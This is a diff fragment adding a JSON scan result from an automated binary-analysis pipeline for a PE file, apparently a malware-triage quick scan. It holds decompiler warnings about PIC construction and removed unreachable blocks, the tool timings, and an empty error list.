+        "decompilation": "\n/* WARNING: Possible PIC construction at 0x000140001c77: Changing call to branch */\n/* WARNING: Possible PIC construction at 0x000140001cac: Changing call to branch */\n/* WARNING: Possible PIC construction at 0x000140001e40: Changing call to branch */\n/* WARNING: Possible PIC construction at 0x00014000204e: Changing call to branch */\n/* WARNING: Possible PIC construction at 0x000140001dde: Changing call to branch */\n/* WARNING: Possible PIC construction at 0x000140002005: Changing call to branch */\n/* WARNING: Possible PIC construction at 0x000140001f61: Changing call to branch */\n/* WARNING: Possible PIC construction at 0x000140001f04: Changing call to branch */\n/* WARNING: Removing unreachable block (ram,0x000140001f66) */\n/* WARNING: Removing unreachable block (ram,0x00014000200a) */\n/* WARNING: Removing unreachable block (ram,0x000140001de3) */\n/* WARNING: Removing unreachable block (ram,0x000140001e45) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001cb5) */\n/* WARNING: Removing unreachable block (ram,0x000140001cf0) */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001f09) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) */\n/* WARNING: Removing unreachable block (ram,0x00014"
+      }
+    },
+    "script_decompile": null,
+    "unpack_result": null,
+    "errors": [],
+    "duration_s": 4.18
+  },
+  "_format": "pe",
+  "_timings": {
+    "capa": 1.98,
+    "pe_imports": 0.01,
+    "yara": 3.81,
+    "floss": 10.15,
+    "malcat": 4.18
+  },
+  "_stage": "quick_scan"
+}
